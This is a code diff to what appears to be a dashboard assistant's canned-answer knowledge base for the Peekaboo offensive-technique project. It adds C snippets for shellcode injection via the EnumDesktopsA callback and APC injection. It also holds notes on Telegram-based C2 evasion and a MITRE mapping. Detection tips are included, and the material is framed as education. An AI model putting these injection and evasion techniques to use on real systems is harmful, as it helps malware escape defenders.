@@ -432,6 +432,7 @@ All techniques are framed educationally - each module links to a blog post expla
         """Peekaboo covers several process injection techniques:
 
 **1. VirtualAllocEx + WriteProcessMemory** (`injection-1`)
+
 ```c
 LPVOID mem = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 WriteProcessMemory(hProc, mem, shellcode, len, NULL);
@@ -441,10 +442,31 @@ MITRE: **T1055** - Process Injection
 
 **2. EnumDesktopsA callback** (`injection-2`)
 Abuses `EnumDesktopsA` to execute shellcode via a legitimate Windows callback - avoids `CreateRemoteThread` which is heavily monitored.
+
+```c
+LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+RtlMoveMemory(mem, my_payload, sizeof(my_payload));
+EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
+```
 MITRE: **T1055.012**
 
 **3. APC Injection** (`injection-3`)
 Queues shellcode as an Asynchronous Procedure Call into an alertable thread.
+
+```c
+// allocate a memory buffer for payload
+my_payload_mem = VirtualAllocEx(hProcess, NULL, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+// write payload to allocated buffer
+WriteProcessMemory(hProcess, my_payload_mem, my_payload, my_payload_len, NULL);
+
+// inject into the suspended thread.
+PTHREAD_START_ROUTINE apc_r = (PTHREAD_START_ROUTINE)my_payload_mem;
+QueueUserAPC((PAPCFUNC)apc_r, hThread, NULL);
+
+// resume to suspended thread
+ResumeThread(hThread);
+```
 MITRE: **T1055.004**
 
 Detection: all three generate `OpenProcess` + `VirtualAllocEx` calls - monitor with Sysmon Event ID 10."""
@@ -462,10 +484,10 @@ GET https://api.telegram.org/bot<TOKEN>/getUpdates
 POST https://api.telegram.org/bot<TOKEN>/sendDocument
 ```
 
-**Why it evades detection:**
-- Traffic looks like normal HTTPS to `api.telegram.org` (legitimate CDN)
-- No custom C2 domain to blocklist
-- Blends with user Telegram traffic on corporate networks
+**Why it evades detection:**    
+    - Traffic looks like normal HTTPS to `api.telegram.org` (legitimate CDN)    
+    - No custom C2 domain to blocklist    
+    - Blends with user Telegram traffic on corporate networks    
 
 **MITRE:** T1102 (Web Service), T1071.001 (Application Layer Protocol)
 
@@ -500,14 +522,14 @@ Detection: look for memory regions with `RWX` permissions, `NtProtectVirtualMemo
         r"mitre att.?ck|ttp|tactic|technique",
         """Peekaboo maps directly to **MITRE ATT&CK** across these technique families:
 
-| Tactic | Techniques | Modules |
-|---|---|---|
-| Execution | T1059, T1106 | shellcoding, syscalls |
-| Persistence | T1547, T1574 | registry run, DLL hijack |
-| Defense Evasion | T1027, T1562 | encryption, AMSI bypass |
-| Privilege Escalation | T1055, T1134 | injection, token theft |
-| C2 | T1071, T1102 | Telegram, GitHub, Bitbucket |
-| Exfiltration | T1041 | C2 channel exfil |
+|       Tactic         | Techniques   |          Modules            |
+|----------------------|--------------|-----------------------------|
+| Execution            | T1059, T1106 | shellcoding, syscalls       |
+| Persistence          | T1547, T1574 | registry run, DLL hijack    |
+| Defense Evasion      | T1027, T1562 | encryption, AMSI bypass     |
+| Privilege Escalation | T1055, T1134 | injection, token theft      |
+| C2                   | T1071, T1102 | Telegram, GitHub, Bitbucket |
+| Exfiltration         | T1041        | C2 channel exfil            |
 
 Use the **MITRE ATT&CK** tab in this dashboard to:
 - Browse all 150+ ATT&CK groups and their techniques
@@ -518,11 +540,11 @@ Use the **MITRE ATT&CK** tab in this dashboard to:
         r"what model|which (llm|model|ai)|ollama model|qwen",
         """The AI assistant supports three providers - switch with the buttons above:
 
-| Provider | Model | Notes |
-|---|---|---|
-| **Ollama** | `qwen3:1.7b` | Local, offline, ~35 tok/s on CPU |
+| Provider   |        Model       |               Notes                 |
+|------------|--------------------|-------------------------------------|
+| **Ollama** | `qwen3:1.7b`       | Local, offline, ~35 tok/s on CPU    |
 | **Gemini** | `gemini-2.0-flash` | API, fast, full KB in system prompt |
-| **Claude** | `claude-opus-4-6` | API, best quality, prompt-cached KB |
+| **Claude** | `claude-opus-4-6`  | API, best quality, prompt-cached KB |
 
 For Ollama, the assistant uses **RAG** - it embeds your question with `nomic-embed-text`, retrieves the top-6 most relevant blog posts from the local index, and injects only that context. Much more focused than dumping the entire KB."""
     ),
